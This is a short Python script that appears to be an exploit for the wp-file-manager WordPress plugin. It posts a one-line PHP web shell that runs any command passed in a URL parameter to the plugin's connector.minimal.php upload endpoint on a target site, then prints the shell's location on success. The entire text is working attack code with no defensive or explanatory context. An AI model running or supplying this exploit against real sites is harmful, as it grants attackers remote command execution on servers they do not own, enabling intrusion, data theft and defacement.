import requests

def run_exploit(target_url):
    shell = {
        "upload[]": ("shell.php", "<?php system($_GET['cmd']); ?>", "application/x-php")
    }
    endpoint = f"{target_url}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
    
    try:
        resp = requests.post(endpoint, files=shell, timeout=10)
        if resp.status_code == 200 and "shell.php" in resp.text:
            print(f"[+] Exploit success! Shell uploaded at: {target_url}/wp-content/plugins/wp-file-manager/lib/php/shell.php")
            return True
    except Exception as e:
        print(f"[!] Exploit error: {e}")
    return False
